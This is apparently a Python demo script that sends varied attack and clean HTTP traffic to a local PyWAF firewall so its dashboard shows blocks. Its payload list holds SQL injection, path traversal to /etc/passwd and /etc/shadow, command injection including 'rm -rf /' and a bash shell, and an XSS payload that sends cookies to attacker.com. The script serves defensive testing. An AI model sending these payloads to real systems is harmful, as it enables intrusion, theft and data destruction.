#!/usr/bin/env python3
"""
PyWAF Continuous Attack Simulator for Live Demo.

Runs continuous, varied attack and clean traffic streams for a set duration (e.g., 20 minutes)
so that the live SSE dashboard displays dynamic real-time events, threat breakdown, and IP metrics.
"""
import sys
import time
import random
import json
import urllib.request
import urllib.parse
from datetime import datetime

TARGET_BASE = "http://127.0.0.1:8080"
DURATION_MINUTES = 20
DURATION_SECONDS = DURATION_MINUTES * 60

# Pool of simulated attacker & benign IPs
IPS = [
    "185.220.101.5",     # Tor exit node simulation
    "45.33.32.156",      # Scanner simulation
    "198.51.100.42",     # External IP
    "203.0.113.19",      # External IP
    "192.0.2.88",        # Testnet IP
    "104.244.42.1",      # Cloud IP
    "172.56.21.89",      # Mobile carrier IP
    "89.248.165.71",     # Known scanning network
    "127.0.0.1",         # Localhost
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/8.4.0",
    "Go-http-client/1.1",
]

# Attack scenarios: (type, method, path, query_or_body, is_json)
ATTACK_VECTORS = [
    # SQLi
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("' OR 1=1 --"), None, False),
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("1 UNION SELECT username, password FROM users"), None, False),
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("admin' --"), None, False),
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("1; DROP TABLE logs; --"), None, False),
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("1' AND SLEEP(5) --"), None, False),
    ("SQL_INJECTION", "GET", "/search?q=" + urllib.parse.quote("1' WAITFOR DELAY '0:0:5'--"), None, False),
    ("SQL_INJECTION", "POST", "/api/data", json.dumps({"filter": "admin' OR '1'='1"}), True),
    ("SQL_INJECTION", "POST", "/login", json.dumps({"username": "' OR 1=1 --", "password": "x"}), True),

    # XSS
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("<script>alert('pwned')</script>"), None, False),
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("<img src=x onerror=alert(document.cookie)>"), None, False),
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("javascript:alert(1)"), None, False),
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("<svg onload=alert('XSS')>"), None, False),
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("<iframe src=javascript:alert(1)>"), None, False),
    ("XSS_ATTACK", "POST", "/api/data", json.dumps({"comment": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"}), True),
    ("XSS_ATTACK", "GET", "/search?q=" + urllib.parse.quote("eval(atob('YWxlcnQoMSk='))"), None, False),

    # Path Traversal
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote("../../etc/passwd"), None, False),
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote("..\\..\\windows\\win.ini"), None, False),
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote("%252e%252e%252f%252e%252e%252fetc%252fpasswd"), None, False),
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote("/etc/shadow"), None, False),
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote(".htaccess"), None, False),
    ("PATH_TRAVERSAL", "GET", "/search?q=" + urllib.parse.quote("/var/log/auth.log"), None, False),

    # Command Injection
    ("COMMAND_INJECTION", "POST", "/api/data", json.dumps({"cmd": "$(whoami)"}), True),
    ("COMMAND_INJECTION", "POST", "/api/data", json.dumps({"target": "127.0.0.1; cat /etc/passwd"}), True),
    ("COMMAND_INJECTION", "POST", "/api/data", json.dumps({"run": "`id`"}), True),
    ("COMMAND_INJECTION", "GET", "/search?q=" + urllib.parse.quote("; rm -rf /"), None, False),
    ("COMMAND_INJECTION", "GET", "/search?q=" + urllib.parse.quote("&& /bin/bash -i"), None, False),
    ("COMMAND_INJECTION", "GET", "/search?q=" + urllib.parse.quote("|| powershell.exe Get-Process"), None, False),

    # LDAP Injection
    ("LDAP_INJECTION", "GET", "/search?q=" + urllib.parse.quote(")(|(cn=*))"), None, False),
    ("LDAP_INJECTION", "GET", "/search?q=" + urllib.parse.quote("*)(objectClass=*"), None, False),
    ("LDAP_INJECTION", "GET", "/search?q=" + urllib.parse.quote("(&(sn=Smith)(givenName=John))"), None, False),

    # Header Injection
    ("HEADER_INJECTION", "GET", "/search?q=" + urllib.parse.quote("Set-Cookie: evil_token=123"), None, False),

    # Clean traffic
    ("CLEAN", "GET", "/", None, False),
    ("CLEAN", "GET", "/search?q=" + urllib.parse.quote("best firewall practices"), None, False),
    ("CLEAN", "GET", "/search?q=" + urllib.parse.quote("cybersecurity monitoring 2026"), None, False),
    ("CLEAN", "GET", "/api/users", None, False),
    ("CLEAN", "GET", "/health", None, False),
    ("CLEAN", "POST", "/api/data", json.dumps({"user": "alice", "action": "view_profile"}), True),
    ("CLEAN", "POST", "/login", json.dumps({"username": "admin", "password": "admin"}), True),
]


def send_request(vector, client_ip):
    threat_type, method, path, body, is_json = vector
    url = TARGET_BASE + path
    headers = {
        "X-Forwarded-For": client_ip,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json"
    }
    data = None
    if body is not None:
        data = body.encode('utf-8')
        if is_json:
            headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, "ALLOWED"
    except urllib.error.HTTPError as e:
        return e.code, "BLOCKED"
    except Exception as e:
        return 0, f"ERROR: {e}"


def trigger_rate_limit_burst(client_ip="198.51.100.99"):
    """Quickly fire requests to demonstrate rate limiting kicking in."""
    burst_count = 105
    for _ in range(burst_count):
        req = urllib.request.Request(
            f"{TARGET_BASE}/api/users",
            headers={"X-Forwarded-For": client_ip, "Accept": "application/json"},
            method="GET"
        )
        try:
            with urllib.request.urlopen(req, timeout=3):
                pass
        except urllib.error.HTTPError as e:
            if e.code == 429:
                break
        except Exception:
            break


def main():
    duration = DURATION_SECONDS
    if len(sys.argv) > 1:
        try:
            duration = int(float(sys.argv[1]) * 60)
        except ValueError:
            pass

    start_time = time.time()
    end_time = start_time + duration
    total_sent = 0
    blocked_count = 0
    passed_count = 0

    print("=" * 65)
    print("🛡️  PyWAF CONTINUOUS ATTACK SIMULATOR")
    print(f"Target       : {TARGET_BASE}")
    print(f"Dashboard    : {TARGET_BASE}/waf/dashboard")
    print(f"Duration     : {duration // 60} minutes ({duration} seconds)")
    print(f"Started at   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 65, flush=True)

    last_burst_time = start_time
    last_report_time = start_time

    while time.time() < end_time:
        now = time.time()
        elapsed_min = (now - start_time) / 60
        remaining_min = (end_time - now) / 60

        # Trigger occasional rate limit test burst every ~4 minutes
        if now - last_burst_time > 240:
            burst_ip = f"198.51.100.{random.randint(10, 99)}"
            trigger_rate_limit_burst(burst_ip)
            last_burst_time = now

        # Pick a random vector and IP
        vector = random.choice(ATTACK_VECTORS)
        ip = random.choice(IPS)

        status, action = send_request(vector, ip)
        total_sent += 1
        if status in (403, 429):
            blocked_count += 1
        elif status == 200:
            passed_count += 1

        # Periodic log every 10 seconds or 15 requests
        if total_sent % 15 == 0 or (now - last_report_time > 10):
            print(
                f"[{datetime.now().strftime('%H:%M:%S')}] "
                f"Progress: {elapsed_min:.1f}m / {duration // 60}m | "
                f"Sent: {total_sent:4d} | "
                f"Blocked: {blocked_count:4d} | "
                f"Passed: {passed_count:4d} | "
                f"Last: {vector[0]:<17} from {ip:<15} [{status}]",
                flush=True
            )
            last_report_time = now

        # Smooth pacing: 0.6s to 1.3s between requests
        time.sleep(random.uniform(0.6, 1.3))

    total_time = (time.time() - start_time) / 60
    print("\n" + "=" * 65)
    print(f" Simulation completed in {total_time:.1f} minutes!")
    print(f" Total requests sent: {total_sent}")
    print(f" Threats blocked:     {blocked_count}")
    print(f" Clean passed:        {passed_count}")
    print("=" * 65, flush=True)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nSimulator stopped by user.")
